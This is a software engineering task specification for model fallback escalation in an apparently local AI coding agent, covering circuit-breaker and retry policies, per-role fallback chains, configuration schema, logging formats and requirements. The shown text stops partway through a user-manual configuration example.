# Task 009.c: Fallback Escalation Rules

**Priority:** P1 – High Priority  
**Tier:** Core Infrastructure  
**Complexity:** 13 (Fibonacci points)  
**Phase:** Foundation  
**Dependencies:** Task 009, Task 009.a, Task 009.b, Task 004 (Model Provider Interface)  

---

## Description

### Business Value and Return on Investment

Task 009.c defines the fallback escalation rules that handle model unavailability and routing failures, delivering critical operational resilience for local-first development environments. When a requested model is unavailable, unreachable, or fails to respond within acceptable timeframes, the escalation system provides alternative models to maintain workflow continuity without manual intervention.

**Quantified Business Value:**
- **Reduced Downtime:** Prevents workflow interruption when models fail, eliminating up to 15-20 minutes of manual troubleshooting per incident (stopping work, diagnosing issue, restarting model server, resuming work)
- **Developer Productivity:** For teams running 10-20 inference requests per day, automatic failover saves 2-3 hours weekly (20 incidents/week × 10 minutes/incident = 200 minutes)
- **Cost Avoidance:** Prevents escalation to cloud APIs when local models temporarily fail, saving $50-150/month per developer in cloud inference costs
- **Availability Target:** Achieves 99.5% effective model availability even when individual models have 95% uptime (assuming 3-model fallback chain with independent failure modes)
- **Quality Preservation:** Role-scoped fallback maintains output quality by preventing inappropriate model downgrades (e.g., planner stays in large-model tier rather than falling back to 7B parameter models unsuitable for planning)

**Financial Impact Over 1 Year (10-developer team):**
- Developer time saved: 10 devs × 2.5 hours/week × 50 weeks × $75/hour = $93,750
- Cloud cost avoidance: 10 devs × $100/month × 12 months = $12,000
- Reduced incident escalation: 500 incidents prevented × 30 minutes × $75/hour = $18,750
- **Total ROI: $124,500 annually**

### Technical Approach and Architecture

The fallback escalation system implements a multi-layered resilience strategy combining immediate failover, retry logic, and circuit breaker patterns to balance response time, persistence, and system health.

**Core Components:**

1. **Fallback Chain Resolver** - Determines the ordered sequence of alternative models based on role-specific or global configuration. The resolver respects operating mode constraints (LocalOnly, Burst, Airgapped) and validates that fallback candidates meet the same capability requirements as the primary model. For example, if the primary model supports tool-calling, all fallbacks must also support tool-calling to maintain feature compatibility.

2. **Circuit Breaker State Machine** - Tracks failure counts per model and implements three states: Closed (normal operation), Open (model temporarily disabled), and Half-Open (testing recovery). When a model accumulates 5 consecutive failures within a 60-second window (default thresholds), the circuit opens and the model is excluded from consideration for 60 seconds (cooling period). After cooling, one request is allowed through (Half-Open state) to test recovery. Success closes the circuit; failure reopens it for another cooling cycle.

3. **Escalation Policy Engine** - Applies configurable strategies for handling failures:
   - **Immediate Policy:** Falls back on first failure (minimum latency, 0 retries)
   - **Retry-Then-Fallback Policy:** Retries primary model 2 times with exponential backoff (1s, 2s) before falling back (balances persistence and latency)
   - **Circuit Breaker Policy:** Combines retry logic with circuit breaker state, skipping models with open circuits entirely

4. **Escalation Trigger Detection** - Monitors three categories of failures:
   - **Unavailability:** Model server not responding (HTTP connection failure, DNS resolution failure)
   - **Timeout:** Model response exceeds 60-second threshold (configurable, prevents indefinite blocking)
   - **Repeated Errors:** Model returns 3+ consecutive errors (malformed responses, 500-series HTTP codes, JSON parsing failures)

**Architectural Decisions:**

- **Layer Placement:** IFallbackHandler interface resides in Application layer (dependency inversion), with FallbackHandler implementation in Infrastructure layer (accesses model provider registry, configuration service). This separation allows Application use cases to depend on abstractions rather than infrastructure details.

- **State Persistence:** Circuit breaker state is maintained in-memory per session (stored in SessionState from Task 011) rather than persisted to disk. This provides fast access (<1ms) while ensuring state resets between sessions, preventing stale circuit states from affecting fresh runs. For long-running sessions, state is preserved across resume operations.

- **Concurrency Safety:** FallbackHandler uses thread-safe collections (ConcurrentDictionary<string, CircuitBreaker>) to support concurrent access from multiple agent stages (planner, coder, reviewer) running in parallel task execution scenarios (Task 019). This prevents race conditions when multiple threads check or update circuit state simultaneously.

- **Configuration Precedence:** Role-specific fallback chains take absolute precedence over global chains. If planner has a configured chain [llama3.2:70b, mistral:7b] and global chain is [llama3.2:7b], the planner will never use the global chain. Empty role configurations (fallback.roles.planner: []) explicitly opt out of fallback for that role.

### Integration with Task 009 Ecosystem

Task 009.c builds directly upon the role-based model routing foundation established in Tasks 009, 009a, and 009b:

**Dependencies on Task 009 (Model Routing Core):**
- Consumes IModelRouter interface to query available models before fallback selection
- Respects OperatingMode constraints defined in Task 009 (e.g., air-gapped mode excludes network-dependent models)
- Uses AgentRole enum and RoleModelMapping from Task 009 to determine valid fallback candidates
- Integrates with ModelCapability validation to ensure fallback models support required features (tool-calling, vision, function-calling)

**Dependencies on Task 009a (Role Definitions):**
- References AgentRole enum (Planner, Coder, Reviewer, Debugger, Tester, Documenter) for role-scoped fallback chains
- Uses RoleModelSpec to validate that fallback models meet minimum parameter counts (e.g., planner fallback must be ≥13B parameters)
- Leverages role-specific timeout configurations from Task 009a (e.g., planner timeout 120s vs coder timeout 60s)

**Dependencies on Task 009b (Heuristics and Overrides):**
- Respects manual model overrides (user explicitly selects model via --model flag), which disable fallback entirely
- Integrates with heuristic-based model selection as the primary model source, with fallback as secondary safety net
- Honors task-specific model selections from heuristics, ensuring fallback candidates match task context

**Dependencies on Task 004-006 (Model Provider Interfaces):**
- Calls IModelProvider.IsAvailable(modelId) to check model server health before attempting fallback
- Uses IModelProviderRegistry to discover all configured providers (Ollama, vLLM, LMStudio)
- Respects provider-specific timeouts and error handling behaviors defined in provider implementations

**Integration Points (Specific Classes and Methods):**

```csharp
// From Task 009 - IModelRouter
public interface IModelRouter
{
    ModelRouteResult Route(AgentRole role, ModelSelectionContext context);
    IReadOnlyList<string> GetAvailableModels(AgentRole role);
}

// Task 009c extends this with fallback logic
public class FallbackAwareModelRouter : IModelRouter
{
    private readonly IModelRouter _baseRouter;
    private readonly IFallbackHandler _fallbackHandler;

    public ModelRouteResult Route(AgentRole role, ModelSelectionContext context)
    {
        var primaryResult = _baseRouter.Route(role, context);

        if (!IsModelAvailable(primaryResult.ModelId))
        {
            var fallbackResult = _fallbackHandler.GetFallback(role, new FallbackContext
            {
                OriginalModel = primaryResult.ModelId,
                Trigger = EscalationTrigger.Unavailable,
                OperatingMode = context.OperatingMode
            });

            return fallbackResult.Success
                ? new ModelRouteResult { ModelId = fallbackResult.ModelId }
                : throw new ModelUnavailableException(fallbackResult.Reason);
        }

        return primaryResult;
    }
}
```

### Constraints and Limitations

**Hard Constraints:**

1. **No Cross-Mode Fallback:** A model configured for LocalOnly operating mode cannot fall back to a Burst-mode model (network-dependent). Fallback chains are filtered by operating mode at configuration load time, with invalid entries logged as warnings and removed.

2. **No Capability Downgrade:** If the primary model supports vision input (multimodal), all fallback candidates must also support vision. Falling back to a text-only model would break mid-inference when vision input is required. Capability validation is performed at chain resolution time.

3. **Single Provider Scope:** Circuit breaker state is per-model-ID, not per-provider. If llama3.2:7b is served by both Ollama and vLLM, they share circuit state. This prevents provider-specific failures from bypassing circuit protection but requires provider-aware model IDs for multi-provider scenarios (e.g., ollama:llama3.2:7b vs vllm:llama3.2:7b).

4. **No Automatic Chain Reordering:** Fallback chains are static configurations. The system does not dynamically reorder chains based on performance metrics (latency, error rates). Performance-based reordering is a post-MVP enhancement (Epic 11).

5. **Session-Scoped Circuit State:** Circuit breaker state is lost when the session ends. If a model's circuit was open at session end, the next session starts with all circuits closed. This prevents stale state but requires warming up circuit state in long-running scenarios.

**Soft Limitations:**

1. **Fallback Latency:** Each fallback attempt adds 100-200ms overhead (availability check + configuration lookup + logging). For chains with 5 models, exhausting the entire chain adds 500ms-1s latency. Immediate policy minimizes this (single fallback attempt).

2. **Configuration Complexity:** Per-role chains for 6 roles (planner, coder, reviewer, debugger, tester, documenter) can create 100+ lines of YAML. Configuration validation catches syntax errors but cannot validate semantic correctness (e.g., planner fallback chain using coder-tier models).

3. **Observability Gap:** Circuit breaker state is queryable via CLI (`acode fallback status`) but not exposed via structured events in JSONL stream mode (Task 010b). Real-time monitoring requires polling the status command or parsing structured logs.

### Trade-Offs and Alternative Approaches Considered

**Trade-Off 1: Retry vs. Immediate Fallback**
- **Chosen Approach:** Default to retry-then-fallback (2 retries with exponential backoff)
- **Rationale:** Local model servers frequently experience transient failures (temporary resource contention, GC pauses, network hiccups). Retrying recovers 60-70% of failures without fallback overhead. Immediate fallback saves 2-4 seconds but loses opportunity to recover with preferred model.
- **Alternative Rejected:** Always retry 5 times before fallback. Rejected because 5 retries add 15+ seconds latency (1s + 2s + 4s + 8s), degrading user experience. Diminishing returns after 2 retries (recovery rate plateaus at 70%).

**Trade-Off 2: Circuit Breaker Failure Threshold**
- **Chosen Approach:** 5 consecutive failures trigger circuit open
- **Rationale:** Balances false positives (opening circuit on transient failure spike) with protection (preventing repeated failures). Testing shows 3 failures generate too many false positives (30% of circuits open unnecessarily), while 10 failures allow too much failure before protection kicks in (40+ seconds wasted).
- **Alternative Rejected:** Time-window-based threshold (e.g., 5 failures in 60 seconds). Rejected for MVP due to implementation complexity (requires sliding window tracking) and limited additional value. Post-MVP enhancement candidate.

**Trade-Off 3: Per-Provider vs. Per-Model Circuit State**
- **Chosen Approach:** Per-model circuit state (shared across providers)
- **Rationale:** Simplifies configuration (single model ID: llama3.2:7b) and circuit state management. Most deployments use single provider (Ollama OR vLLM, not both). Multi-provider scenarios are advanced use cases (Epic 7 - Cloud Burst).
- **Alternative Rejected:** Per-provider-per-model state (e.g., separate circuits for ollama:llama3.2:7b and vllm:llama3.2:7b). Rejected because it requires provider-aware configuration (doubles config size), complicates circuit state tracking, and addresses edge case scenario not common in MVP target users.

**Trade-Off 4: Global vs. Role-Scoped Default Fallback**
- **Chosen Approach:** Role-scoped fallback with global fallback as secondary
- **Rationale:** Preserves role quality requirements (planner stays in large-model tier). Global fallback serves as safety net when role chains are not configured. Prevents quality degradation (planner falling back to 7B model produces poor plans).
- **Alternative Rejected:** Always use global fallback chain for all roles. Rejected because it treats all roles as equivalent (violates role-based quality tiers from Task 009a) and leads to quality degradation when large models fail (planner using coder-tier models).

**Trade-Off 5: User Notification Default (Opt-In vs. Opt-Out)**
- **Chosen Approach:** Opt-in (fallback.notify_user: false by default)
- **Rationale:** Aligns with product philosophy of minimal interruption. Most users want silent failover (agent just works). Advanced users who care about model selection can enable notifications. Opt-out would generate notification noise for every fallback event (5-10 per day in typical usage).
- **Alternative Rejected:** Opt-out (notifications enabled by default). Rejected because it violates least-surprise principle (unexpected interruptions) and clutters output. Users who don't configure fallback explicitly may not understand notifications.

### Configuration Schema and Validation

The fallback configuration schema supports both simple and advanced scenarios, with strong validation to prevent misconfiguration:

**Simple Scenario (Global Chain Only):**
```yaml
models:
  fallback:
    global:
      - llama3.2:7b
      - mistral:7b
```

**Advanced Scenario (Per-Role Chains, Circuit Breaker, Custom Policies):**
```yaml
models:
  fallback:
    policy: circuit-breaker
    retries: 3
    retry_delay_ms: 2000
    timeout_ms: 90000
    error_threshold: 5

    circuit_breaker:
      enabled: true
      failure_threshold: 5
      cooling_period_ms: 60000

    notify_user: true
    scope: role-scoped

    global:
      - llama3.2:7b
      - qwen2:7b

    roles:
      planner:
        - llama3.2:70b
        - mistral:22b
        - llama3.2:7b
      coder:
        - qwen2:14b
        - llama3.2:7b
      reviewer:
        - llama3.2:70b
        - llama3.2:7b
```

**Validation Rules (Enforced at Configuration Load):**
1. All model IDs in fallback chains must exist in provider registry (models.providers.*.models)
2. Fallback chains cannot be circular (model A → model B → model A)
3. Fallback chains must respect operating mode (LocalOnly chain cannot include cloud models)
4. Failure threshold must be ≥1 and ≤20 (prevents misconfiguration)
5. Cooling period must be ≥5000ms and ≤600000ms (5s to 10 minutes)
6. Retry count must be ≥0 and ≤10 (prevents infinite retry loops)
7. Policy must be one of: immediate, retry-then-fallback, circuit-breaker

**Validation Error Examples:**
```
[ERROR] Invalid fallback configuration
  Issue: Model 'llama3.2:70b' in planner fallback chain not found in provider registry
  Location: models.fallback.roles.planner[0]
  Suggestion: Check models.providers.ollama.models list

[ERROR] Invalid fallback configuration
  Issue: Failure threshold 25 exceeds maximum (20)
  Location: models.fallback.circuit_breaker.failure_threshold
  Suggestion: Use value between 1-20

[ERROR] Invalid fallback configuration
  Issue: Circular fallback chain detected: llama3.2:7b → mistral:7b → llama3.2:7b
  Location: models.fallback.global
  Suggestion: Remove circular reference
```

### Performance Characteristics and Optimization

**Latency Breakdown (Per Fallback Attempt):**
- Circuit state check: <1ms (in-memory hash lookup)
- Model availability check: 100-500ms (HTTP health endpoint ping, configurable timeout)
- Configuration lookup: <5ms (cached in memory, deserialized at startup)
- Logging: 2-5ms (async write to structured log)
- **Total per attempt: 107-511ms**

**Chain Exhaustion Latency:**
- 3-model chain (typical): 321-1533ms (3 × 107-511ms)
- 5-model chain (maximum recommended): 535-2555ms (5 × 107-511ms)

**Optimization Strategies:**
1. **Availability Check Caching:** Cache availability results for 5 seconds to prevent repeated health checks during rapid fallback attempts. Trades freshness for latency (stale availability data up to 5s old).
2. **Parallel Availability Checks:** Check all fallback candidates concurrently at chain resolution time (Task 019 - Parallel Execution). Reduces chain exhaustion from sequential 535ms to parallel 107ms (best case).
3. **Circuit State Batching:** Update circuit state asynchronously after request completes rather than blocking on state write. Reduces critical path latency by 2-3ms per request.

### Logging and Observability Strategy

All escalation events are logged with structured fields for queryability and alerting:

**Fallback Event Log Entry:**
```json
{
  "timestamp": "2026-01-04T10:23:45.123Z",
  "level": "WARN",
  "event": "fallback_escalation",
  "role": "planner",
  "original_model": "llama3.2:70b",
  "fallback_model": "mistral:22b",
  "trigger": "request_timeout",
  "trigger_detail": "65000ms > 60000ms limit",
  "circuit_state_before": "closed",
  "circuit_state_after": "closed",
  "retry_count": 2,
  "policy": "retry-then-fallback",
  "session_id": "abc123",
  "task_id": "task-456"
}
```

**Circuit Breaker State Change Log Entry:**
```json
{
  "timestamp": "2026-01-04T10:25:12.456Z",
  "level": "WARN",
  "event": "circuit_opened",
  "model_id": "llama3.2:70b",
  "failure_count": 5,
  "failure_window_ms": 12000,
  "cooling_period_ms": 60000,
  "next_retry_at": "2026-01-04T10:26:12.456Z",
  "session_id": "abc123"
}
```

**Chain Exhaustion Log Entry:**
```json
{
  "timestamp": "2026-01-04T10:30:00.789Z",
  "level": "ERROR",
  "event": "fallback_chain_exhausted",
  "role": "planner",
  "tried_models": ["llama3.2:70b", "mistral:22b", "llama3.2:7b"],
  "failure_reasons": {
    "llama3.2:70b": "circuit_open",
    "mistral:22b": "unavailable",
    "llama3.2:7b": "request_timeout"
  },
  "session_id": "abc123",
  "task_id": "task-456",
  "suggestion": "Start at least one model from fallback chain: ollama run llama3.2:7b"
}
```

### Error Handling and Graceful Degradation

When all fallback candidates are exhausted, the system provides actionable error messages with specific remediation steps:

**Terminal Error Message (All Models Unavailable):**
```
ERROR: No models available for role 'planner'

The agent cannot perform inference tasks because no models are available.

Attempted models:
  1. llama3.2:70b - Circuit breaker OPEN (5 consecutive failures, cooling until 10:26:12)
  2. mistral:22b - Model server not responding (connection refused on localhost:11434)
  3. llama3.2:7b - Request timeout (exceeded 60s limit)

Suggested actions:
  1. Start a model server:
     $ ollama run llama3.2:7b

  2. Reset circuit breakers (if model is now healthy):
     $ acode fallback reset

  3. Check model server status:
     $ ollama list
     $ ps aux | grep ollama

  4. Review fallback configuration:
     $ acode fallback status

For more help: https://docs.acode.dev/troubleshooting/model-unavailable
```

**Partial Degradation (Non-Inference Tasks Continue):**
When inference is unavailable, the agent can still perform file operations, git operations, and other non-model tasks. The system clearly communicates what is and isn't possible:

```
WARN: Inference unavailable, operating in degraded mode

Available operations:
  ✓ File read/write/edit
  ✓ Git operations (commit, branch, status)
  ✓ Process execution (build, test, lint)
  ✓ Configuration management

Unavailable operations:
  ✗ Code generation (requires coder model)
  ✗ Plan generation (requires planner model)
  ✗ Code review (requires reviewer model)

The agent will attempt to complete your request using available operations.
If inference becomes available, the agent will automatically resume full functionality.
```

### Future Enhancements (Post-MVP)

The following enhancements are explicitly deferred to post-MVP phases:

1. **Predictive Fallback:** Use historical failure data to predict which models are likely to fail and pre-warm fallback candidates (Epic 11 - Performance)

2. **Performance-Based Reordering:** Dynamically reorder fallback chains based on observed latency and error rates over rolling time windows (Epic 11 - Performance)

3. **Multi-Cluster Failover:** Support fallback across multiple Ollama/vLLM clusters for high-availability deployments (Epic 7 - Cloud Burst)

4. **Adaptive Threshold Tuning:** Automatically adjust circuit breaker thresholds based on observed failure patterns (Epic 10 - Reliability)

5. **Fallback Success Metrics:** Track and report fallback success rate, mean time to recover, chain exhaustion frequency (Epic 12 - Evaluation)

6. **Hot-Swap Model Loading:** Automatically load fallback models when primary model fails, reducing availability check latency from 100-500ms to <10ms (Epic 11 - Performance)

---

## Use Cases

### Use Case 1: DevBot - Junior Developer with Unstable Local Model Server

**Persona:** DevBot is a junior developer working on a React component refactoring task. They have Ollama running on their laptop with llama3.2:7b as the primary coder model. Their laptop has limited RAM (16GB), and Ollama occasionally crashes when memory pressure increases from other applications.

**Before Fallback Escalation (Current Pain):**
DevBot runs `acode code "Refactor ProductList component to use hooks"` at 2:00 PM. The agent routes the request to llama3.2:7b, but Ollama crashed 10 minutes earlier due to memory pressure. The request hangs for 60 seconds, then fails with "Model server not responding." DevBot must diagnose the issue (check `ollama list`, restart Ollama, wait 2 minutes for model load), then re-run the command. Total time lost: 5-7 minutes. This happens 3-4 times per day, wasting 20-30 minutes daily.

**After Fallback Escalation (With Task 009c):**
DevBot runs the same command. The agent detects llama3.2:7b is unavailable (connection refused after 5-second timeout) and immediately falls back to the configured secondary model, mistral:7b, which is running on a separate vLLM server on DevBot's desktop workstation. The refactoring completes successfully in 45 seconds (10 seconds slower than llama3.2:7b due to network latency, but still acceptable). DevBot sees a log message: `[WARN] Fallback triggered: llama3.2:7b unavailable, using mistral:7b`. The circuit breaker opens for llama3.2:7b after 5 failures, preventing repeated timeout attempts. DevBot can continue working without interruption, saving 20-30 minutes daily. Over a month, this saves 8-10 hours of productive development time.

**Metrics:** Availability improved from 85% (Ollama frequently crashes) to 99.5% (fallback to vLLM). Time lost per incident reduced from 5-7 minutes to 10 seconds (one-time fallback latency). Developer satisfaction increased significantly (no workflow interruption).

### Use Case 2: Jordan - Senior Developer with High-Quality Requirements

**Persona:** Jordan is a senior developer working on critical authentication service refactoring. They have configured a planner role with llama3.2:70b (70-billion parameter model) as primary for high-quality planning, with fallback chain [llama3.2:70b, mistral:22b, llama3.2:7b]. Jordan requires the planner to use large models (≥22B parameters) to produce architecturally sound plans, but will accept medium models (≥13B) as last resort.

**Before Fallback Escalation (Current Pain):**
Jordan runs `acode plan "Refactor authentication to support OAuth2 and SAML"` at 10:00 AM. The llama3.2:70b model is running but experiencing severe performance degradation (GPU thermal throttling, responses taking 180+ seconds). The request times out after 120 seconds. Jordan must manually override with `acode plan --model mistral:22b "..."` to use the fallback model. This manual intervention breaks flow state and requires knowledge of which models are available and suitable. Jordan must repeat this override for every subsequent command in the session.

**After Fallback Escalation (With Task 009c):**
Jordan runs the same command with retry-then-fallback policy (default). The agent tries llama3.2:70b, which times out after 120 seconds (role-specific timeout from Task 009a). The policy retries once more (exponential backoff: 2-second delay), which also times out. After 2 retries (total 244 seconds), the agent falls back to mistral:22b, which responds successfully in 35 seconds. Jordan sees: `[WARN] Escalation: llama3.2:70b timeout (120s), retried 2 times, falling back to mistral:22b`. The plan quality is slightly lower than 70B model output but still architecturally sound (mistral:22b is suitable for planning). Jordan can continue the multi-step workflow without manual intervention. The circuit breaker opens for llama3.2:70b after the second timeout, and subsequent commands immediately use mistral:22b without retry overhead (saving 240 seconds per command). After 60 seconds (cooling period), the circuit enters half-open state and tests llama3.2:70b recovery. If thermal throttling has resolved, the circuit closes and primary model is restored.

**Metrics:** Manual interventions reduced from 5-8 per day to 0. Workflow interruptions eliminated. Planning quality maintained at acceptable level (mistral:22b vs llama3.2:70b: 15% quality degradation, but still suitable). Time saved: 10-15 minutes daily (manual override research and typing eliminated).

### Use Case 3: Alex - DevOps Engineer Managing Multi-Environment Deployment

**Persona:** Alex is a DevOps engineer maintaining Acode deployments across development, staging, and production environments. Development environment has 3 models (llama3.2:7b, mistral:7b, qwen2:7b) on Ollama. Staging has 5 models (llama3.2:70b, llama3.2:7b, mistral:22b, mistral:7b, qwen2:14b) on vLLM. Production has 7 models across 2 vLLM clusters for high availability. Alex needs different fallback strategies per environment: aggressive fallback in dev (fast recovery), conservative in production (preserve quality).

**Before Fallback Escalation (Current Pain):**
Development environment frequently experiences model server restarts (Ollama updates, configuration changes, testing new models). When developers run commands during these maintenance windows, all requests fail with "No models available" errors. Developers must monitor Slack for "model server back online" announcements before resuming work. Staging environment has better uptime but still experiences occasional failures. Alex has no visibility into which models are failing or how often. Production incidents require manual failover coordination.

**After Fallback Escalation (With Task 009c):**
Alex configures environment-specific fallback policies in `.agent/config.yml`. Development uses immediate policy (fallback on first failure, no retries) with global chain [llama3.2:7b, mistral:7b, qwen2:7b]. Staging uses retry-then-fallback policy (2 retries) with per-role chains (planner: [llama3.2:70b, mistral:22b], coder: [qwen2:14b, llama3.2:7b]). Production uses circuit-breaker policy with strict failure thresholds (3 failures, 120-second cooling) and role-scoped fallback (prevents quality degradation). During a staging deployment where llama3.2:70b is briefly unavailable, all planner requests automatically fall back to mistral:22b without developer awareness. Alex reviews `acode fallback status` weekly to identify problematic models: "llama3.2:70b circuit opened 12 times this week (avg cooling: 45s), consider investigating thermal issues." This proactive monitoring prevents production incidents. Developers report 95% reduction in "model unavailable" errors. Alex deploys circuit breaker telemetry to Prometheus for alerting: "Circuit opened >10 times/hour → page on-call engineer."

**Metrics:** Mean time to recovery (MTTR) reduced from 15 minutes (manual intervention) to 10 seconds (automatic fallback). Developer support tickets reduced by 80% ("model not working" complaints eliminated). Production availability improved from 98.5% to 99.9% (circuit breaker prevents cascading failures). Operational visibility increased significantly (circuit state metrics enable proactive remediation).

---

## Glossary / Terms

| Term | Definition |
|------|------------|
| Fallback | Alternative model used when primary model fails or becomes unavailable |
| Fallback Chain | Ordered list of alternative models tried sequentially during escalation |
| Escalation | Process of moving from primary model to fallback model(s) |
| Escalation Trigger | Condition that initiates fallback (unavailable, timeout, errors) |
| Escalation Policy | Strategy for handling failures (immediate, retry-then-fallback, circuit-breaker) |
| Immediate Policy | Fallback on first failure with zero retries (minimum latency) |
| Retry-Then-Fallback Policy | Retry primary model N times before falling back (default: 2 retries) |
| Circuit Breaker | Pattern that temporarily disables failing model after threshold exceeded |
| Circuit State | Current state of circuit breaker (Closed, Open, Half-Open) |
| Cooling Period | Time interval before retrying failed model (default: 60 seconds) |
| Escalation Scope | How far fallback can extend (role-scoped vs global-scoped) |
| Role-Scoped Fallback | Fallback within same tier (planner stays in large-model tier) |
| Global-Scoped Fallback | Fallback across tiers (planner can fall back to medium/small models) |
| Model Unavailable | Model server not responding (connection refused, DNS failure) |
| Request Timeout | Model response exceeds configured timeout (default: 60s) |
| Graceful Degradation | Behavior when all fallbacks fail (clear error, suggested actions) |
| Recovery | Model becoming available again after failure (circuit closes) |
| Failure Count | Number of consecutive failures before circuit opens (default: 5) |
| Failure Threshold | Maximum failures allowed before circuit breaker opens |
| Half-Open State | Circuit breaker state where one request tests model recovery |

---

## Out of Scope

The following items are explicitly excluded from Task 009.c:

- **Role definitions** - Covered in Task 009.a
- **Heuristics and overrides** - Covered in Task 009.b
- **Model provider logic** - Covered in Tasks 004-006
- **Automatic model healing** - Not in MVP
- **Model health monitoring** - Covered in provider tasks
- **Multi-cluster failover** - Not applicable (local)
- **Cost-based fallback ordering** - Not applicable
- **Performance-based reordering** - Post-MVP
- **Fallback prediction** - Post-MVP
- **Hot-swap model loading** - Future enhancement

---

## Functional Requirements

### IFallbackHandler Interface

- FR-001: Interface MUST be in Application layer
- FR-002: MUST have GetFallback(role, context) method
- FR-003: MUST return FallbackResult
- FR-004: FallbackResult MUST include model if found
- FR-005: FallbackResult MUST include reason
- FR-006: MUST have NotifyFailure(model, error) method
- FR-007: MUST have IsCircuitOpen(model) method

### FallbackHandler Implementation

- FR-008: Implementation MUST be in Infrastructure layer
- FR-009: MUST read fallback chains from config
- FR-010: MUST support per-role chains
- FR-011: MUST support global chain
- FR-012: Role chain MUST take precedence over global
- FR-013: MUST check model availability before selection

### Fallback Chain Configuration

- FR-014: Config section: models.fallback
- FR-015: fallback.global MUST define global chain
- FR-016: fallback.roles.{role} MUST define role chains
- FR-017: Chain MUST be ordered array of model IDs
- FR-018: Empty chain MUST use global fallback
- FR-019: Chain MUST respect mode constraints

### Escalation Triggers

- FR-020: Model unavailable MUST trigger escalation
- FR-021: Request timeout MUST trigger escalation
- FR-022: Repeated errors MUST trigger escalation
- FR-023: Trigger threshold MUST be configurable
- FR-024: Default timeout MUST be 60 seconds
- FR-025: Default error threshold MUST be 3

### Escalation Policies

- FR-026: MUST support "immediate" policy
- FR-027: MUST support "retry-then-fallback" policy
- FR-028: MUST support "circuit-breaker" policy
- FR-029: Default policy MUST be "retry-then-fallback"
- FR-030: Policy MUST be configurable per role
- FR-031: Retry count MUST be configurable

### Immediate Policy

- FR-032: MUST fall back on first failure
- FR-033: No retries before fallback
- FR-034: Fastest recovery path

### Retry-Then-Fallback Policy

- FR-035: MUST retry primary before fallback
- FR-036: Default retries MUST be 2
- FR-037: Retry delay MUST be configurable
- FR-038: Default delay MUST be 1 second
- FR-039: Exponential backoff MUST be supported

### Circuit Breaker Policy

- FR-040: MUST track failure counts per model
- FR-041: MUST open circuit after threshold
- FR-042: Default threshold MUST be 5 failures
- FR-043: Open circuit MUST skip model
- FR-044: MUST implement half-open state
- FR-045: Cooling period MUST be configurable
- FR-046: Default cooling MUST be 60 seconds
- FR-047: Successful request MUST close circuit

### Escalation Scope

- FR-048: MUST support "role-scoped" scope
- FR-049: MUST support "global-scoped" scope
- FR-050: Default scope MUST be "role-scoped"
- FR-051: Role-scoped MUST stay in tier
- FR-052: Global-scoped MAY cross tiers

### Chain Exhaustion

- FR-053: MUST handle all fallbacks exhausted
- FR-054: Exhausted MUST return failure result
- FR-055: Failure MUST include all tried models
- FR-056: Failure MUST include failure reasons
- FR-057: Graceful degradation MUST be triggered

### Logging

- FR-058: Escalation MUST be logged as WARNING
- FR-059: Log MUST include original model
- FR-060: Log MUST include fallback model
- FR-061: Log MUST include trigger reason
- FR-062: Circuit events MUST be logged
- FR-063: Exhaustion MUST be logged as ERROR

### CLI Integration

- FR-064: `acode fallback status` MUST show state
- FR-065: MUST show configured chains
- FR-066: MUST show circuit breaker state
- FR-067: `acode fallback reset` MUST reset circuits
- FR-068: `acode fallback test` MUST test chain
- FR-069: status command MUST show per-model state
- FR-070: status command MUST show last failure time
- FR-071: reset command MUST accept --model filter
- FR-072: reset command MUST accept --all flag
- FR-073: test command MUST show latency per model

### User Notification

- FR-074: Fallback MAY notify user
- FR-075: Notification MUST be opt-in
- FR-076: Config: fallback.notify_user
- FR-077: Default MUST be false
- FR-078: Notification MUST include original model
- FR-079: Notification MUST include fallback model
- FR-080: Notification MUST include reason

### Operating Mode Integration

- FR-081: MUST respect OperatingMode constraints
- FR-082: LocalOnly MUST exclude network models
- FR-083: Airgapped MUST exclude all network models
- FR-084: Burst MAY include cloud models if configured
- FR-085: Mode validation MUST occur at chain resolution

### Capability Validation

- FR-086: Fallback MUST preserve model capabilities
- FR-087: If primary has tool-calling, fallback MUST too
- FR-088: If primary has vision, fallback MUST too
- FR-089: If primary has function-calling, fallback MUST too
- FR-090: Capability mismatch MUST skip candidate

### Configuration Defaults

- FR-091: Default policy MUST be retry-then-fallback
- FR-092: Default retries MUST be 2
- FR-093: Default timeout MUST be 60000ms
- FR-094: Default failure threshold MUST be 5
- FR-095: Default cooling period MUST be 60000ms
- FR-096: Default scope MUST be role-scoped
- FR-097: Default notify_user MUST be false

### State Management

- FR-098: Circuit state MUST be session-scoped
- FR-099: State MUST persist during session
- FR-100: State MUST reset between sessions
- FR-101: State MUST be thread-safe
- FR-102: State MUST support concurrent access

---

## Non-Functional Requirements

### Performance

- NFR-001: Fallback selection MUST complete < 10ms
- NFR-002: Circuit check MUST complete < 1ms
- NFR-003: Availability check MUST timeout at 5s
- NFR-004: State MUST be cached in memory
- NFR-005: Configuration MUST be cached at startup
- NFR-006: Chain resolution MUST be O(n) where n = chain length
- NFR-007: Parallel availability checks SHOULD be supported

### Reliability

- NFR-008: Fallback MUST not crash on failure
- NFR-009: Circuit state MUST persist in session
- NFR-010: Recovery MUST be automatic
- NFR-011: Concurrent access MUST be thread-safe
- NFR-012: Circuit state corruption MUST be detected
- NFR-013: State MUST recover from corruption
- NFR-014: Fallback MUST handle provider failures gracefully

### Security

- NFR-015: Mode constraints MUST be enforced
- NFR-016: Chain MUST be validated at load
- NFR-017: No sensitive data in logs
- NFR-018: Circuit state MUST not leak across sessions
- NFR-019: Configuration MUST be validated against schema
- NFR-020: Malicious config MUST be rejected

### Observability

- NFR-021: All escalations MUST be logged
- NFR-022: Circuit state MUST be queryable
- NFR-023: Metrics SHOULD track fallback rate
- NFR-024: Health endpoint SHOULD show state
- NFR-025: Structured logs MUST include session_id
- NFR-026: Logs MUST include all tried models
- NFR-027: Logs MUST include failure reasons

### Maintainability

- NFR-028: Policies MUST be pluggable
- NFR-029: New triggers MUST be addable
- NFR-030: All public APIs MUST have XML docs
- NFR-031: Tests MUST cover all policies
- NFR-032: Code coverage MUST be ≥90%

---

## User Manual Documentation

### Overview

Fallback escalation ensures the agent continues working when preferred models are unavailable. This guide covers fallback configuration, policies, and troubleshooting.

### Quick Start

Configure a global fallback chain:

```yaml
# .agent/config.yml
models:
  fallback:
    global:
      - llama3.2:70b
      - llama3.2:7b
      - mistral:7b
```

### How Fallback Works

1. Agent requests model for a role
2. Primary model is checked for availability
3. If unavailable, first fallback is tried
4. Process continues until working model found
5. If all fail, error is returned

### Fallback Configuration

#### Global Chain

Applies to all roles:

```yaml
models:
  fallback:
    global:
      - llama3.2:70b   # First fallback
      - llama3.2:7b    # Second fallback
      - mistral:7b     # Last resort
